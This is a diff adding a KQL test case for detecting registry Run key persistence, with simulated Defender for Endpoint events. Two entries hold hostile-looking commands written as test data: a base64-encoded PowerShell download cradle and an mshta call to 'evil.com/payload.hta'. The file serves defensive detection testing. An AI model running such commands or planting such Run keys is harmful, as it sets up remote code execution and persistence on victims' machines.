@@ -1,0 +1,42 @@
+// === Test Case: Registry Run Key Persistence Detection ===
+// Simulates: 2 malicious Run key entries (PowerShell download cradle in Temp,
+// LOLBin mshta) and 1 legit updater entry (lower severity, still logged).
+// Expected: 2 high-severity alerts + 1 medium.
+// Query expects: DeviceRegistryEvents table (Microsoft Defender for Endpoint)
+
+let TestDeviceRegistryEvents = datatable(
+    TimeGenerated: datetime,
+    ActionType: string,
+    RegistryKey: string,
+    RegistryValueName: string,
+    RegistryValueData: string,
+    DeviceName: string,
+    InitiatingProcessAccountName: string,
+    InitiatingProcessFileName: string,
+    InitiatingProcessCommandLine: string,
+    InitiatingProcessParentFileName: string
+)
+[
+    // Malicious: PowerShell download cradle pointing to Temp
+    datetime(2025-07-24 18:00:00), "RegistryValueSet",
+    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+    "SecurityUpdate",
+    "powershell.exe -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACkA",
+    "WS-001", "jsmith", "powershell.exe", "powershell.exe", "explorer.exe",
+
+    // Malicious: mshta LOLBin in Run key
+    datetime(2025-07-24 18:05:00), "RegistryValueSet",
+    "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+    "Updater",
+    "mshta.exe http://evil.com/payload.hta",
+    "WS-002", "akim", "cmd.exe", "cmd.exe /c reg add", "explorer.exe",
+
+    // Legit-ish: real updater (medium severity — logged but not suspicious markers)
+    datetime(2025-07-24 19:00:00), "RegistryValueSet",
+    "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+    "GoogleUpdate",
+    "C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe /c",
+    "WS-003", "SYSTEM", "GoogleUpdateSetup.exe", "GoogleUpdateSetup.exe", "explorer.exe",
+];
+
+TestDeviceRegistryEvents
